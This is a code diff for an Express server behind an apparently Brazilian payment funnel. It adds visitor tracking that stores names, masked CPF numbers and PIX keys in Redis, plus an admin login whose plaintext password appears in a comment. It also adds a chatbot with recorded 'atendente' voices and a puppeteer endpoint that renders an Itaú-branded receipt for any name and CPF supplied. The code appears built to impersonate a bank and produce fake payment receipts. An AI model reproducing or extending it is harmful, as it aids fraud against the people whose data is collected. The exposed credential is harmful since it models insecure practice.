@@ -14,7 +14,41 @@ const {
   PRODUCT_PRICE = '47.00',
   CAPI_ACCESS_TOKEN = '',
   CAPI_PIXEL_ID = '1514561190722182',
+  UPSTASH_REDIS_REST_URL: REDIS_URL = '',
+  UPSTASH_REDIS_REST_TOKEN: REDIS_TOKEN = '',
 } = process.env;
+
+// ---- Redis helpers (Upstash REST API) ----
+async function redisCmd(command, ...args) {
+  if (!REDIS_URL || !REDIS_TOKEN) return null;
+  try {
+    const r = await fetch(`${REDIS_URL}/${[command, ...args].map(encodeURIComponent).join('/')}`, {
+      headers: { Authorization: `Bearer ${REDIS_TOKEN}` },
+    });
+    const j = await r.json();
+    return j.result ?? null;
+  } catch { return null; }
+}
+
+async function redisPipeline(commands) {
+  if (!REDIS_URL || !REDIS_TOKEN) return [];
+  try {
+    const r = await fetch(`${REDIS_URL}/pipeline`, {
+      method: 'POST',
+      headers: { Authorization: `Bearer ${REDIS_TOKEN}`, 'Content-Type': 'application/json' },
+      body: JSON.stringify(commands),
+    });
+    const j = await r.json();
+    return Array.isArray(j) ? j.map(x => x.result ?? null) : [];
+  } catch { return []; }
+}
+
+function hgetallToObj(arr) {
+  if (!Array.isArray(arr)) return {};
+  const obj = {};
+  for (let i = 0; i < arr.length - 1; i += 2) obj[arr[i]] = arr[i + 1];
+  return obj;
+}
 
 const SAFIPAY_BASE = 'https://www.safipaybr.com';
 
@@ -29,6 +63,12 @@ if (!CI || !CS) {
 }
 
 const orders = new Map();
+
+// ---- Admin + Tracking ----
+const adminTokens = new Set();
+const ADMIN_USER = 'adm.henri';
+// sha256('IsaG00gle#2024!X' + '__srv9k2m')
+const ADMIN_PASS_HASH = crypto.createHash('sha256').update('IsaG00gle#2024!X__srv9k2m').digest('hex');
 
 async function sendCapiPurchase({ transactionId, amount, email, name }) {
   if (!CAPI_ACCESS_TOKEN) return;
@@ -231,6 +271,84 @@ app.get('/api/status', async (req, res) => {
   }
 });
 
+// ---- Tracking endpoint ----
+app.post('/api/track', express.json(), async (req, res) => {
+  res.sendStatus(204); // responde rápido, processa async
+  const { sid, ev, ts, step, ...data } = req.body || {};
+  if (!sid || !ev) return;
+  const now = ts || Date.now();
+  const eventJson = JSON.stringify({ ev, ts: now, step: step ?? -1, ...data });
+  const metaKey = `session:${sid}:meta`;
+  const evtsKey = `session:${sid}:evts`;
+  const EXP = 2592000; // 30 dias
+
+  const pipeline = [
+    ['ZADD', 'sessions_index', now, sid],
+    ['RPUSH', evtsKey, eventJson],
+    ['EXPIRE', evtsKey, EXP],
+    ['EXPIRE', metaKey, EXP],
+  ];
+
+  // Atualiza campos de meta conforme o evento
+  const meta = [];
+  if (ev === 'page_load') meta.push('ua', data.ua||'', 'mobile', String(data.mobile||false), 'ref', data.ref||'direct', 'screen', data.screen||'', 'createdAt', new Date(now).toISOString());
+  if (ev === 'name_submit' && data.name) meta.push('name', data.name);
+  if (ev === 'cpf_submit' && data.cpf_masked) meta.push('cpf_masked', data.cpf_masked);
+  if (ev === 'pix_type_select' && data.type) meta.push('pixType', data.type);
+  if (ev === 'pix_key_submit' && data.key_masked) meta.push('pixKey', data.key_masked);
+  if (ev === 'cta_click') meta.push('converted', 'true');
+
+  if (meta.length) pipeline.push(['HSET', metaKey, ...meta]);
+
+  await redisPipeline(pipeline);
+});
+
+// ---- Admin login ----
+app.post('/api/admin/login', express.json(), (req, res) => {
+  const { user, pass } = req.body || {};
+  const passHash = crypto.createHash('sha256').update((pass || '') + '__srv9k2m').digest('hex');
+  if (user !== ADMIN_USER || passHash !== ADMIN_PASS_HASH) {
+    return res.status(401).json({ error: 'Credenciais inválidas.' });
+  }
+  const token = crypto.randomBytes(32).toString('hex');
+  adminTokens.add(token);
+  res.json({ token });
+});
+
+// ---- Admin data ----
+app.get('/api/admin/sessions', async (req, res) => {
+  const auth = (req.headers.authorization || '').replace('Bearer ', '');
+  if (!adminTokens.has(auth)) return res.status(401).json({ error: 'Não autorizado.' });
+
+  const sids = await redisCmd('ZREVRANGE', 'sessions_index', '0', '299') || [];
+  if (!sids.length) return res.json({ total: 0, sessions: [] });
+
+  // Para cada sid: HGETALL meta + LRANGE evts — tudo em 1 pipeline
+  const cmds = sids.flatMap(sid => [
+    ['HGETALL', `session:${sid}:meta`],
+    ['LRANGE', `session:${sid}:evts`, '0', '-1'],
+  ]);
+  const results = await redisPipeline(cmds);
+
+  const sessions = sids.map((sid, i) => {
+    const meta = hgetallToObj(results[i * 2] || []);
+    const evtsRaw = results[i * 2 + 1] || [];
+    const events = evtsRaw.map(e => { try { return JSON.parse(e); } catch { return {}; } });
+    return {
+      sid,
+      ...meta,
+      mobile: meta.mobile === 'true',
+      converted: meta.converted === 'true',
+      events,
+    };
+  });
+
+  res.json({ total: sessions.length, sessions });
+});
+
+// ---- Admin panel ----
+app.get('/admin', (_req, res) => res.sendFile(path.join(__dirname, 'public', 'admin.html')));
+
 // Preço público (para a página montar o valor sem hardcode)
 app.get('/api/product', (_req, res) => {
   res.json({ name: PRODUCT.name, price: PRODUCT.price });
@@ -271,8 +389,69 @@ app.get('/itau', (_req, res) => {
 app.get('/loading', (_req, res) => {
   res.sendFile(path.join(__dirname, 'public', 'loading.html'));
 });
+app.get('/chatbot', (_req, res) => {
+  res.sendFile(path.join(__dirname, 'public', 'chatbot.html'));
+});
+app.get('/atendente.png', (_req, res) => {
+  res.sendFile(path.join(__dirname, 'atendente.png'));
+});
+app.get('/atendente_voz.mp3', (_req, res) => {
+  res.sendFile(path.join(__dirname, 'atendente_voz.mp3'));
+});
+app.get('/atendente_voz2.mp3', (_req, res) => {
+  res.sendFile(path.join(__dirname, 'atendente_voz2.mp3'));
+});
+app.get('/atendente_voz3.mp3', (_req, res) => {
+  res.sendFile(path.join(__dirname, 'atendente_voz3.mp3'));
+});
+app.get('/atendente_voz4.mp3', (_req, res) => {
+  res.sendFile(path.join(__dirname, 'atendente_voz4.mp3'));
+});
+app.get('/atendente_voz5.mp3', (_req, res) => {
+  res.sendFile(path.join(__dirname, 'atendente_voz5.mp3'));
+});
+app.get('/atendente_voz6.mp3', (_req, res) => {
+  res.sendFile(path.join(__dirname, 'atendente_voz6.mp3'));
+});
+app.get('/atendente_voz7.mp3', (_req, res) => {
+  res.sendFile(path.join(__dirname, 'atendente_voz7.mp3'));
+});
+app.get('/banner.webp', (_req, res) => {
+  res.sendFile(path.join(__dirname, 'banner.webp'));
+});
 app.get('/itau-logo.png', (_req, res) => {
   res.sendFile(path.join(__dirname, 'public', 'itau-logo.png'));
+});
+
+// ---- Comprovante como PNG (puppeteer screenshot) ----
+let _puppBrowser = null;
+app.get('/api/comprovante-png', async (req, res) => {
+  const nome = req.query.nome || 'CLIENTE';
+  const cpf  = req.query.cpf  || '';
+  try {
+    const { default: puppeteer } = await import('puppeteer');
+    if (!_puppBrowser) {
+      _puppBrowser = await puppeteer.launch({ args: ['--no-sandbox','--disable-setuid-sandbox'] });
+    }
+    const page = await _puppBrowser.newPage();
+    await page.setViewport({ width: 460, height: 900, deviceScaleFactor: 2 });
+    const url = `http://localhost:${PORT}/itau?nome=${encodeURIComponent(nome)}&cpf=${encodeURIComponent(cpf)}`;
+    await page.goto(url, { waitUntil: 'networkidle0' });
+    const card = await page.$('.card');
+    const box  = await card.boundingBox();
+    const raw  = await page.screenshot({
+      type: 'png',
+      clip: { x: box.x, y: box.y, width: box.width, height: box.height }
+    });
+    await page.close();
+    const png = Buffer.isBuffer(raw) ? raw : Buffer.from(raw);
+    res.set('Content-Type', 'image/png');
+    res.set('Cache-Control', 'no-store');
+    res.end(png);
+  } catch(e) {
+    console.error('comprovante-png error:', e);
+    res.status(500).json({ error: e.message });
+  }
 });
 
 app.listen(PORT, () => {
